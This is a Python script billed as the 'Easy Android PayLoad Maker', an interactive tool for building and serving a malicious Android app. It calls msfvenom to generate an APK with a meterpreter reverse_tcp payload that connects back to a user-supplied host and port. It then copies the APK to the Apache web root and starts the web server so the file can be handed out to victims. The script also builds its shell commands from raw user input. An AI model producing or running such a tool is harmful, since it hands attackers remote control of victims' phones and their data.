import os
import sys
import subprocess
from colorama import init, Fore

# Inizializza colorama
init(autoreset=True)

def print_banner():
    print(Fore.CYAN + """
░▒▓████████▓▒░░▒▓██████▓▒░░▒▓███████▓▒░░▒▓██████████████▓▒░  
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓██████▓▒░ ░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ 
                            Easy Android PayLoad Maker - Version 1.1
                                 Author: ShadowByte
""")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def is_root():
    return os.geteuid() == 0

def create_apk():
    clear_screen()
    print_banner()
    print(Fore.GREEN + "Creating the APK file...")
    apk_name = input(Fore.YELLOW + "Enter the name you want to give to the APK: ")
    ip = input(Fore.YELLOW + "Enter the IP: ")
    port = int(input(Fore.YELLOW + "Enter the port: "))
    command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} R > {apk_name}.apk"
    try:
        subprocess.run(command, shell=True, check=True)
        print(Fore.GREEN + f"APK file {apk_name}.apk created successfully!")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error creating APK: {e}")

def move_apk():
    clear_screen()
    print_banner()
    print(Fore.GREEN + "Moving the APK file...")
    apk_name = input(Fore.YELLOW + "Enter the name of the APK file: ")
    try:
        subprocess.run(f"mv {apk_name}.apk /var/www/html/", shell=True, check=True)
        print(Fore.GREEN + f"APK file {apk_name}.apk moved successfully to /var/www/html/")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error moving APK: {e}")

def manage_apache_service():
    clear_screen()
    print_banner()
    print(Fore.GREEN + "Managing Apache2 service...")
    action = input(Fore.YELLOW + "Enter 'start' to start or 'stop' to stop Apache2 service: ")
    try:
        if action.lower() == 'start':
            subprocess.run("service apache2 start", shell=True, check=True)
            print(Fore.GREEN + "Apache2 service started successfully!")
        elif action.lower() == 'stop':
            subprocess.run("service apache2 stop", shell=True, check=True)
            print(Fore.GREEN + "Apache2 service stopped successfully!")
        else:
            print(Fore.RED + "Invalid action! Please enter 'start' or 'stop'.")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Error managing Apache2 service: {e}")

def main():
    clear_screen()
    print_banner()
    print(Fore.GREEN + "Welcome to Easy Android PayLoad Maker,")

    # Check if the program is run as root
    if not is_root():
        print(Fore.RED + "Error: This program must be run as root!")
        sys.exit(1)

    while True:
        print("\nMenu:")
        print("1. Create Payload APK")
        print("2. Move APK to /var/www/html")
        print("3. Manage Apache2 Service")
        print("4. Exit")

        choice = input(Fore.YELLOW + "\nEnter your choice (1-4): ")

        if choice == '1':
            create_apk()
        elif choice == '2':
            move_apk()
        elif choice == '3':
            manage_apache_service()
        elif choice == '4':
            print(Fore.GREEN + "Exiting program. Goodbye!")
            sys.exit(0)
        else:
            print(Fore.RED + "Invalid choice! Please enter a number from 1 to 4.")

if __name__ == "__main__":
    main()
